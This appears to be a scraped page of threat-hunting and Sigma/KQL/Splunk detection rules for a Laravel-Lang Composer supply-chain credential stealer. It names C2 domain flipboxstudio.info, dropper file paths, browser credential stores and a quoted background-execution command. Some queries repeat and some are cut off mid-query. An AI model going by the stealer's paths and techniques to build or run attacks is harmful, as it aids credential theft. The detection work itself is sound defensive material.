[LLM] Orphaned process (ppid=1) executing from /tmp hidden hex path (post-dropper stage-2) Actions on Objectives High
Hunts processes reparented to init/systemd (ppid=1) whose image or command-line resolves to /tmp/.<6-12 hex chars> — the exact reparenting + execute-from-deleted-path shape left behind by the Laravel-Lang stage-2 loader after it backgrounds via `php "$f" > /dev/null 2>&1 &` and rm-deletes its own dropper files. Visible in process telemetry even after the file is unlinked. Rationale: Anchors on the article's explicit process IOCs: 'an orphaned php process with ppid=1' and 'an orphaned unnamed ELF process with ppid=1, executing from a now deleted path under /tmp'. Combines the reparent-to-init shape with the /tmp/.<hex> path generated by bin2hex(random_bytes(6)). Survives the self-delete because process metadata is captured at exec time.
ATT&CKT1036.005 T1564.001 T1070.004 T1620
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("systemd","init")
| where (FolderPath matches regex @"^/tmp/\.[a-f0-9]{6,12}$")
   or (FileName matches regex @"^php[0-9]?$" and ProcessCommandLine matches regex @"/tmp/\.[a-f0-9]{6,12}(\.php)?")
   or (FolderPath startswith "/tmp/.laravel_locale")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, ProcessId, InitiatingProcessId
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has_any ("systemd","init") or ParentProcessId == 1
| where (ActingProcessName matches regex @"^/tmp/\.[a-f0-9]{6,12}$")
   or (ActingProcessName endswith "/php" and ActingProcessCommandLine matches regex @"/tmp/\.[a-f0-9]{6,12}(\.php)?")
   or (ActingProcessName startswith "/tmp/.laravel_locale")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessId, ActingProcessId
| order by TimeGenerated desc

[LLM] GitHub bulk git tag force-push by single actor across multiple org repos Delivery Medium
Hunts the org-wide tag-rewrite shape that defined the initial-access step: one GitHub actor force-pushing tags across multiple repositories in the same org within a short window (the Laravel-Lang attacker rewrote 502+ tags across four repos in 88 minutes). Combine with commit-author imposter signature 'Your Name' / 'you@example.com'. Rationale: Anchors on the article's exact shape: 'every git tag across multiple popular Composer packages within a single 15 minute window', 502 tags rewritten in one repo, four repos hit in 88 minutes, all by the same compromised credential. The commit-author imposter strings 'Your Name' / 'you@example.com' are also called out verbatim. Sentinel/Defender/Falcon are left empty because GitHub audit telemetry is not in their canonical schemas — Splunk and Datadog (via the GitHub integration) are the realistic shipping paths.
ATT&CKT1195.002 T1078 T1098
Data sourcesChange.All_Changes
source:github (@action:git.push OR @action:git.create) @git.ref:refs/tags/*
CLOUD
index=* sourcetype IN ("github:audit","github_audit_log","github:enterprise:audit") (action="git.push" OR action="git.create" OR action="protected_branch.policy_override") ref="refs/tags/*"
| eval repo_org=mvindex(split(repo,"/"),0)
| stats min(_time) as first_seen max(_time) as last_seen dc(repo) as repo_count dc(ref) as tag_count values(repo) as repos values(ref) as refs by actor, repo_org
| eval window_seconds = last_seen - first_seen
| where tag_count >= 10 AND repo_count >= 2 AND window_seconds <= 3600
| eval window_minutes = round(window_seconds/60, 1)
| convert ctime(first_seen) ctime(last_seen)
| sort - tag_count
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("flipboxstudio.info")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["flipboxstudio.info"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Composer install of malicious helpers.php in laravel-lang vendor package
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Supply Chain Attack Targets Laravel-Lang Packages with Credential Stealer
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] cscript.exe launching .vbs from .laravel_locale temp directory · [LLM] Stealer or VBS launcher dropped into .laravel_locale temp directory · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] C2 egress to flipboxstudio.info from Laravel-Lang composer dropper · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process
[LLM] C2 egress to flipboxstudio.info from Laravel-Lang composer dropper Command & Control High
Detects any HTTP/DNS contact with the hard-coded C2 domain flipboxstudio.info (decoded from integer array in the malicious src/helpers.php). Both the /payload fetch (stage-2 stealer download) and /exfil (AES-256 encrypted credential exfil) hit the same FQDN, so any resolution or connection is unambiguously malicious. Rationale: Anchored on the article's named C2 domain flipboxstudio.info plus the /payload and /exfil URL paths quoted verbatim. Corroborated by https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities and https://gbhackers.com/malicious-laravel-packages/. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/ • https://cybersecuritynews.com/malicious-packages-disguised-as-laravel-utilities/

[LLM] cscript.exe launching .vbs from .laravel_locale temp directory Installation High
Detects the Windows arm of the Laravel-Lang dropper: the malicious src/helpers.php writes an 8-hex-character .vbs launcher into <temp>\.laravel_locale\ and executes it silently via cscript. Process tree is php/php-fpm/php-cgi (or anything that triggered composer autoload) → cscript.exe with a .vbs path containing `.laravel_locale`. Rationale: Anchored on two article-quoted strings together: `<tmp>/.laravel_locale/<8 random hex chars>.vbs` and the explicit `runs the payload silently via cscript` Windows-launcher behaviour. The 8-hex regex makes this near-zero-FP. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/
ATT&CKT1059.005 T1105 T1195.002
Data sourcesEndpoint.Processes
let LookbackDays = 14d;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where FileName =~ "cscript.exe" or FileName =~ "wscript.exe"
| where ProcessCommandLine has @".laravel_locale"
   and ProcessCommandLine matches regex @"(?i)\.laravel_locale[\\/][0-9a-f]{8}\.vbs"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFileName,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
let LookbackDays = 14d;
union isfuzzy=true
(
  SecurityEvent
  | where TimeGenerated > ago(LookbackDays)
  | where EventID == 4688
  | where NewProcessName endswith "\\cscript.exe" or NewProcessName endswith "\\wscript.exe"
  | where CommandLine has ".laravel_locale" and CommandLine matches regex @"(?i)\.laravel_locale[\\\\/][0-9a-f]{8}\.vbs"
  | project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
),
(
  ImProcessCreate
  | where TimeGenerated > ago(LookbackDays)
  | where ActingProcessName endswith "cscript.exe" or ActingProcessName endswith "wscript.exe"
  | where ActingProcessCommandLine has ".laravel_locale"
     and ActingProcessCommandLine matches regex @"(?i)\.laravel_locale[\\\\/][0-9a-f]{8}\.vbs"
  | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName
)
| order by TimeGenerated desc

[LLM] Composer install of malicious helpers.php in laravel-lang vendor package Delivery Medium
Detects composer (or any file mover) writing a src/helpers.php file under vendor/laravel-lang/{lang,attributes,http-statuses}/ — the article confirms this file does not exist in the legitimate packages and was injected by the attacker via fork-tag commits. Catches the supply-chain payload at composer-install time, before the dropper detonates. Rationale: Anchored on the article-quoted file name (`src/helpers.php`) plus the three affected package names verbatim (`laravel-lang/lang`, `laravel-lang/attributes`, `laravel-lang/http-statuses`). The file is novel to the malicious tags, so any write is high-fidelity. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://thehackernews.com/2026/03/fake-laravel-packages-on-packagist.html

| project Timestamp, DeviceName, FolderPath, FileName,

[LLM] Stealer or VBS launcher dropped into .laravel_locale temp directory Installation High
Detects file creation inside <temp>\.laravel_locale\ matching the article's exact naming patterns: 12-hex-character .php (the ~5,900-line stealer fetched from flipboxstudio.info/payload) or 8-hex-character .vbs (Windows cscript launcher). Catches the runtime dropper post-detonation, including the marker MD5 file that gates re-execution. Rationale: Anchored on the article's verbatim path patterns: `<tmp>/.laravel_locale/<md5_hash>` (32-hex marker), `<tmp>/.laravel_locale/<12 random hex chars>.php` (stealer body), `<tmp>/.laravel_locale/<8 random hex chars>.vbs` (Windows launcher). The directory name plus the hex-only filename regex makes near-zero-FP. Cross-checked with https://gbhackers.com/malicious-laravel-packages/. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/
ATT&CKT1105 T1036.005 T1140

     or (FileName matches regex @"(?i)^[0-9a-f]{8}\.vbs$")
     or (FileName matches regex @"(?i)^[0-9a-f]{32}$")

title: Laravel-Lang Stealer Files Dropped in .laravel_locale Temp Dir
id: 1c8a6e4d-3f72-49bc-9d18-7a2bf0c4e5e9
description: Detects creation of files inside <temp>\.laravel_locale\ matching the Laravel-Lang stealer payload pattern (12-hex .php, 8-hex .vbs, or 32-hex MD5 marker file). Article (Aikido, 22 May 2026) confirms the dropper writes these exact patterns to the system temp directory.
references:
  - https://www.aikido.dev/blog/supply-chain-attack-targets-laravel-lang-packages-with-credential-stealer
  - https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities
author: SOC Detection Engineering
date: 2026/05/23
tags:
  - attack.execution
  - attack.t1105
  - attack.defense_evasion
  - attack.t1036.005
logsource:
  category: file_event
detection:
  selection_dir:
    TargetFilename|contains:
      - '\.laravel_locale\'
      - '/.laravel_locale/'
  selection_name:
    TargetFilename|re|i:
      - '\.laravel_locale[\\/][0-9a-f]{12}\.php$'
      - '\.laravel_locale[\\/][0-9a-f]{8}\.vbs$'
      - '\.laravel_locale[\\/][0-9a-f]{32}$'
  condition: selection_dir and selection_name
falsepositives:
  - None expected; folder name is attacker-specific
level: critical
(source:windows.sysmon @EventID:11 @TargetFilename:(*\\.laravel_locale\\* OR */.laravel_locale/*)) OR (source:linux.auditd @file.path:(*/.laravel_locale/*)) OR (source:windows.defender @FilePath:(*\\.laravel_locale\\* OR */.laravel_locale/*))
#event_simpleName=FileWritten
| TargetFileName=/[\\\/]\.laravel_locale[\\\/]/i
| (TargetFileName=/[\\\/]\.laravel_locale[\\\/][0-9a-f]{12}\.php$/i or TargetFileName=/[\\\/]\.laravel_locale[\\\/][0-9a-f]{8}\.vbs$/i or TargetFileName=/[\\\/]\.laravel_locale[\\\/][0-9a-f]{32}$/i)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Filesystem.process_name) as proc values(Filesystem.user) as user values(Filesystem.file_path) as paths from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\.laravel_locale\\*" OR Filesystem.file_path="*/.laravel_locale/*") by Filesystem.dest Filesystem.file_name Filesystem.action
| `drop_dm_object_name(Filesystem)`
| where match(file_name, "(?i)^[0-9a-f]{12}\.php$") OR match(file_name, "(?i)^[0-9a-f]{8}\.vbs$") OR match(file_name, "(?i)^[0-9a-f]{32}$")
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.process_name) as proc values(Filesystem.user) as user values(Filesystem.file_path) as paths from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\.laravel_locale\\*" OR Filesystem.file_path="*/.laravel_locale/*") by Filesystem.dest Filesystem.file_name Filesystem.action
| `drop_dm_object_name(Filesystem)`
| where match(file_name, "(?i)^[0-9a-f]{12}\.php$") OR match(file_name, "(?i)^[0-9a-f]{8}\.vbs$") OR match(file_name, "(?i)^[0-9a-f]{32}$")
| convert ctime(firstTime) ctime(lastTime)
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("flipboxstudio.info")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["flipboxstudio.info"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats `summariesonly` count from datamodel=Web
        where Web.dest IN ("flipboxstudio.info")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats `summariesonly` count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("flipboxstudio.info")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats summariesonly=false count from datamodel=Web
        where Web.dest IN ("flipboxstudio.info")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats summariesonly=false count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("flipboxstudio.info")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",
                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Software\Google\Chrome\Extensions\'
            - '\Software\Microsoft\Edge\Extensions\'
            - '\Software\Mozilla\Firefox\Extensions\'
    condition: selection
falsepositives:
    - Group-policy-managed extension whitelists
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Registry
    where (Registry.registry_path="*\Software\Google\Chrome\Extensions\*"
        OR Registry.registry_path="*\Software\Microsoft\Edge\Extensions\*"
        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
| `drop_dm_object_name(Registry)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Registry
    where (Registry.registry_path="*\Software\Google\Chrome\Extensions\*"
        OR Registry.registry_path="*\Software\Microsoft\Edge\Extensions\*"
        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
| `drop_dm_object_name(Registry)`
Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
